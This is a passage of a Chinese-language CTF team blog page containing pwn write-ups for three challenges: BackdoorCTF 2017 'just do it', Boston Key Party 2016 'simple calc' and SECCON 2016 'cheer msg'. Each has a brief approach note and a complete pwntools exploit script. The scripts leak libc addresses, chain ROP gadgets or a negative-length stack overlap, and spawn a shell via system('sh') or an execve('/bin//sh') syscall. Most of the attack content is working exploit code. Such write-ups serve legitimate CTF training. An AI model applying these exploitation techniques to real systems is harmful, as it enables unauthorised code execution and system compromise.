+<h3 id="BackdoorCTF-2017-just-do-it"><a href="#BackdoorCTF-2017-just-do-it" class="headerlink" title="BackdoorCTF 2017-just do it"></a>BackdoorCTF 2017-just do it</h3><p>这个题我也是遇到了和之前especially_good_jmps一样的困扰，缓冲区没有清空，无法利用read函数将’sh’读到指定data段，后来想到再leak出地址后可以利用fflsh函数清空一次缓冲区，然后再读入’sh’即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;32_chal&#39;)</span><br><span class="line"></span><br><span class="line">pop_esi &#x3D; 0x0804853d</span><br><span class="line">main_addr &#x3D; 0x0804847D</span><br><span class="line">got &#x3D; 0x0804A00C</span><br><span class="line">write_plt &#x3D; 0x08048370</span><br><span class="line">data_addr &#x3D; 0x0804A020</span><br><span class="line">read_plt &#x3D; 0x08048330</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p32(write_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(got)</span><br><span class="line">payload +&#x3D; p32(4)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Hello pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">function &#x3D; &#39;read&#39;</span><br><span class="line">da &#x3D; u32(p.recvuntil(&#39;H&#39;)[1:5])</span><br><span class="line">addr &#x3D; da</span><br><span class="line">base_addr &#x3D; addr - libc32.sym[function]</span><br><span class="line">sys_addr &#x3D; base_addr + libc32.sym[&#39;system&#39;]</span><br><span class="line">gets_addr &#x3D; base_addr + libc32.sym[&#39;gets&#39;]</span><br><span class="line">fflush_addr &#x3D; base_addr + libc32.sym[&#39;fflush&#39;]</span><br><span class="line">print(hex(base_addr))</span><br><span class="line">print(hex(sys_addr))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x68</span><br><span class="line">payload +&#x3D; p32(fflush_addr)  #use the fflush to make the read function works</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p32(read_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line">payload +&#x3D; p32(5)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">p.sendline(&#39;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x68</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="boston-key-party-2016-simple-calc"><a href="#boston-key-party-2016-simple-calc" class="headerlink" title="boston key party 2016-simple calc"></a>boston key party 2016-simple calc</h3><p>这题其实本身挺简单，也是个静态编译，不过输入需要判断，简单写个判断函数就行，只是一开始懒得自己码代码，想去看看别的dalao怎么做，结果看有的exp一个一个字节手动构造，给我看傻了，遂还是自己写了2333，注意四个字节一个数字，分情况用加，减，乘三种拆分即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;simple_calc&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SEND(number, A1, A2):</span><br><span class="line">    p.recvuntil(&#39;&#x3D;&gt; &#39;)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line">    p.recvuntil(&#39;Integer x:&#39;)</span><br><span class="line">    p.sendline(str(A1))</span><br><span class="line">    p.recvuntil(&#39;Integer y:&#39;)</span><br><span class="line">    p.sendline(str(A2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_factor(number):</span><br><span class="line">    for i in range(40, (int)(math.sqrt(number))):</span><br><span class="line">        if number % i &#x3D;&#x3D; 0:</span><br><span class="line">            return i, number&#x2F;i</span><br><span class="line">    return 0, 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;0&#39; * 0x30</span><br><span class="line">payload +&#x3D; p64(0)                         # the parameter of free would be covered by this</span><br><span class="line">payload &#x3D; payload.ljust(0x48, &quot;\x00&quot;)     # let the program conntinue, use the null</span><br><span class="line"></span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1060) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000044db34) # pop rax ; ret</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041c61f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401b73) # pop rdi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1060) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000437a85) # pop rdx ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041c61f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000400488) # syscall</span><br><span class="line"></span><br><span class="line">len &#x3D; len(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;calculations:&#39;)</span><br><span class="line">p.sendline(str(len&#x2F;4 + 1))</span><br><span class="line"></span><br><span class="line">for i in range(len&#x2F;4):                    # make the ropchain works</span><br><span class="line">    x &#x3D; u32(payload[i * 4: (i+1) * 4])</span><br><span class="line">    if x &gt; 80 and x &lt; 2 ** 31:</span><br><span class="line">        if x % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            a1 &#x3D; x&#x2F;2</span><br><span class="line">            a2 &#x3D; x&#x2F;2</span><br><span class="line">        else:</span><br><span class="line">            a1 &#x3D; (x+1)&#x2F;2</span><br><span class="line">            a2 &#x3D; (x-1)&#x2F;2</span><br><span class="line">        SEND(1, a1, a2)</span><br><span class="line">    elif x &lt; 80:</span><br><span class="line">        a1 &#x3D; x + 0x28</span><br><span class="line">        a2 &#x3D; 0x28</span><br><span class="line">        SEND(2, a1, a2)</span><br><span class="line">    else:</span><br><span class="line">        a1, a2 &#x3D; get_factor(x)</span><br><span class="line">        SEND(3, a1, a2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&#x3D;&gt; &#39;)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&#39;5&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Seccon-CTF-2016-cheer-msg"><a href="#Seccon-CTF-2016-cheer-msg" class="headerlink" title="Seccon CTF 2016-cheer msg"></a>Seccon CTF 2016-cheer msg</h3><p>这个题属实恶心了我好久，一开始找不到洞怎么用，我傻傻的一直没有点开alloca函数，天真的以为那是个库函数，结果后来发现这就是个sub esp, eax， 然后就想到了用负数来让message函数的栈和主函数重合，来溢出，注意的是这里的canary就是个摆设，只有message函数有，主函数没有。<br>然而这只是恶心的开始，然后我就看着message函数的开始是sub esp, 0x68，就想着本身会抬高0x68，一直用这个数据算，结果怎么都拿不到shell，后来看了别的dalao写的exp，自己好好动调了一下，发现总共会抬升0x70，果然凡事别太自信，不行就动调。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p &#x3D; process(&#39;cheer_msg&#39;)</span><br><span class="line"></span><br><span class="line">main_addr &#x3D; 0x080485CA</span><br><span class="line">printf_plt &#x3D; 0x08048430</span><br><span class="line">printf_got &#x3D; 0x0804A010</span><br><span class="line">format_addr &#x3D; 0x08048888</span><br><span class="line">data_addr &#x3D; 0x0804A030</span><br><span class="line"></span><br><span class="line">length &#x3D; -0x70                              # the real offset should debug by yourself</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(printf_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(printf_got)</span><br><span class="line">payload +&#x3D; p32(format_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Message :&#39;)</span><br><span class="line">printf_addr &#x3D; u32(p.recvuntil(&#39;Hello&#39;)[2: 6])</span><br><span class="line">base_addr &#x3D; printf_addr - libc32.sym[&#39;printf&#39;]</span><br><span class="line">gets_addr &#x3D; base_addr + libc32.sym[&#39;gets&#39;]</span><br><span class="line">sys_addr &#x3D; base_addr + libc32.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(gets_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>大概就先写这些吧，最近刚开学，课内压力还不大，趁这个机会好好补补pwn，然而估计TSCTF还是会划水2333，保研要紧保研要紧~</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/avatar.png" alt="Merak">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        Merak
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        CTF team
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Beijing</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            8
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            3
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            6
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/BuptMerak" target="_blank" rel="noopener">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/BuptMerak">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://ieki.xyz" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Eki</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">ieki.xyz</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.duanyufi.com" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Du@nYuFi</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.duanyufi.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://blog.csdn.net/crisprx" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Crisprx</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">blog.csdn.net</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.zhaobairen.club" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Retr_0</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.zhaobairen.club</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://me.csdn.net/Zarcs_233" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Rimao</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">me.csdn.net</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://lordriot.live/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">LordRiot</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">lordriot.live</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.arklight.xyz/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Arklight</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.arklight.xyz</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/Pwn/">
+            <span class="level-start">
+                <span class="level-item">Pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/contest/">
+            <span class="level-start">
+                <span class="level-item">contest</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/web/">
+            <span class="level-start">
+                <span class="level-item">web</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
